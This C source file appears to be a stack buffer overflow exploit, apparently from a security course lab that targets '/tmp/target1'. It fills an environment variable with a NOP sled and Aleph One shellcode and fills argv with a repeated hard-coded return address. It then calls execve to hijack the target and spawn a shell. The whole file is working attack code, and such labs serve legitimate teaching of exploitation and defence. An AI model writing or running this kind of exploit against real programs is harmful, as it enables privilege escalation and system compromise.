#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

unsigned long get_sp(void)
{
	__asm__("movl %esp, %eax");
}

unsigned char *getByteArrayFromLong(unsigned long longInt)
{
	unsigned char *byteArray = malloc(sizeof(char) * 4);

	// convert from an unsigned long int to a 4-byte array
	byteArray[0] = (int)((longInt >> 24) & 0xFF) ;
	byteArray[1] = (int)((longInt >> 16) & 0xFF) ;
	byteArray[2] = (int)((longInt >> 8) & 0XFF);
	byteArray[3] = (int)((longInt & 0XFF));

	return byteArray;
}

int main(void)
{
	char *args[3]; 
	char *env[1];

	int shellLen = strlen(shellcodeAlephOne);
	int A1 = 203;
	unsigned char esp[4];

	char bufferPtr[400] = {0x41};	
	char strPtr[12] = {0x41};	
	esp[3] = 0xbf; esp[2] = 0xff; esp[1] = 0xfc; esp[0] = 0xb4;	

	for(int i = 0; i < sizeof(strPtr);i+=4) {
		
		strPtr[i + 0] = esp[0];
		strPtr[i + 1] = esp[1];
		strPtr[i + 2] = esp[2];
		strPtr[i + 3] = esp[3];
	}

	for(int i = 0; i < sizeof(bufferPtr);i+=4) {
		
		bufferPtr[i + 0] = esp[0];
		bufferPtr[i + 1] = esp[1];
		bufferPtr[i + 2] = esp[2];
		bufferPtr[i + 3] = esp[3];
	}

	for(int i = 0; i < A1;i++)
        {
                bufferPtr[i] = 0x90;
        }

	for(int k = 0; k < shellLen; k++)
        {
                bufferPtr[A1 + k] = shellcodeAlephOne[k];
        }

	args[0] = TARGET;
	args[1] = strPtr;
	args[2] = NULL;
	env[0]  = bufferPtr;
	execve(TARGET, args, env);
	//fprintf(stderr, "execve failed.\n");

	return 0;
}


